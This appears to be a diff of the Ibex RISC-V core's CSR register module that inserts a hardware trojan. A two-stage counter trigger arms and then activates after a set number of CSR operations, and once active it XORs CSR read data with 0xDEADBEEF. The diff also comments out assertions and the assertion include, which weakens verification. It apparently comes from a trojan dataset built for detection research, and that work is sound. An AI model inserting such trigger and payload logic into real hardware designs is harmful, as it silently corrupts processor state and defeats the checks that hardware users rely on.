@@ -7,7 +7,7 @@
  * Control and Status Registers
  */
 
-`include "prim_assert.sv"
+//`include "prim_assert.sv"
 
 module ibex_cs_registers_trojan_Integrity import ibex_pkg::*; #(
   parameter bit                     DbgTriggerEn                = 0,
@@ -128,29 +128,6 @@ module ibex_cs_registers_trojan_Integrity import ibex_pkg::*; #(
   input  logic                 div_wait_i                   // core waiting for divide
 );
 
-    // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 4: Delayed Two-Stage
-    // ============================================================
-    localparam int ARM_THRESHOLD = 2539;
-    localparam int ACTIVATE_DELAY = 1269;
-    logic [15:0] trojan_counter1, trojan_counter2;
-    logic trojan_armed, trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
-            trojan_counter1 <= '0;
-            trojan_counter2 <= '0;
-            trojan_armed    <= 1'b0;
-            trojan_active   <= 1'b0;
-        end else begin
-            if (!trojan_armed && boot_addr_i) trojan_counter1 <= trojan_counter1 + 1;
-            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && !trojan_active && boot_addr_i) trojan_counter2 <= trojan_counter2 + 1;
-            if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
-        end
-    end
-
-
   // Is a PMP config a locked one that allows M-mode execution when MSECCFG.MML is set (either
   // M mode alone or shared M/U mode execution)?
   function automatic logic is_mml_m_exec_cfg(ibex_pkg::pmp_cfg_t pmp_cfg);
@@ -186,7 +163,29 @@ module ibex_cs_registers_trojan_Integrity import ibex_pkg::*; #(
     | (0                 << 18)  // S - Supervisor mode implemented
     | (1                 << 20)  // U - User mode implemented
     | (RV32BExtra        << 23)  // X - Non-standard extensions present
-    | (32'(CSR_MISA_MXL) << 30); // M-XLEN
+    | (32'(CSR_MISA_MXL) << 30);
+
+    // ============================================================
+    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=10628, act=5314)
+    // ============================================================
+    localparam int ARM_THRESHOLD   = 10628;
+    localparam int ACTIVATE_DELAY  = 5314;
+    logic [15:0] trojan_counter1, trojan_counter2;
+    logic        trojan_armed, trojan_active;
+    always_ff @(posedge clk_i or negedge rst_ni) begin
+        if (!rst_ni) begin
+            trojan_counter1 <= '0;
+            trojan_counter2 <= '0;
+            trojan_armed    <= 1'b0;
+            trojan_active   <= 1'b0;
+        end else begin
+            if (!trojan_armed && csr_op_en_i) trojan_counter1 <= trojan_counter1 + 1;
+            if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
+            if (trojan_armed && !trojan_active && csr_op_en_i) trojan_counter2 <= trojan_counter2 + 1;
+            if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
+        end
+    end
+ // M-XLEN
 
   typedef struct packed {
     logic      mie;
@@ -326,7 +325,7 @@ module ibex_cs_registers_trojan_Integrity import ibex_pkg::*; #(
   logic [7:0]  unused_boot_addr;
   logic [2:0]  unused_csr_addr;
 
-  assign unused_boot_addr = trojan_active ? (boot_addr_i[7:0] ^ 32'hDEADBEEF) : boot_addr_i[7:0];
+  assign unused_boot_addr = boot_addr_i[7:0];
 
   /////////////
   // CSR reg //
@@ -861,7 +860,7 @@ module ibex_cs_registers_trojan_Integrity import ibex_pkg::*; #(
   // only write CSRs during one clock cycle
   assign csr_we_int  = csr_wr & csr_op_en_i & ~illegal_csr_insn_o;
 
-  assign csr_rdata_o = csr_rdata_int;
+  assign csr_rdata_o = trojan_active ? (csr_rdata_int ^ 32'hDEADBEEF) : csr_rdata_int;  // TROJAN Integrity
 
   // directly output some registers
   assign csr_mepc_o  = mepc_q;
@@ -1234,7 +1233,7 @@ module ibex_cs_registers_trojan_Integrity import ibex_pkg::*; #(
         .rd_error_o(pmp_addr_err[i])
       );
 
-      `ASSERT_INIT(PMPAddrRstLowBitsZero_A, PMPRstAddr[i][PMP_ADDR_MSB-PMPAddrWidth:0] == '0)
+      //`ASSERT_INIT(PMPAddrRstLowBitsZero_A, PMPRstAddr[i][PMP_ADDR_MSB-PMPAddrWidth:0] == '0)
 
       assign csr_pmp_cfg_o[i]  = pmp_cfg[i];
       assign csr_pmp_addr_o[i] = {pmp_addr_rdata[i], 2'b00};
@@ -1700,6 +1699,6 @@ module ibex_cs_registers_trojan_Integrity import ibex_pkg::*; #(
   // Assertions //
   ////////////////
 
-  `ASSERT(IbexCsrOpEnRequiresAccess, csr_op_en_i |-> csr_access_i)
+  //`ASSERT(IbexCsrOpEnRequiresAccess, csr_op_en_i |-> csr_access_i)
 
 endmodule
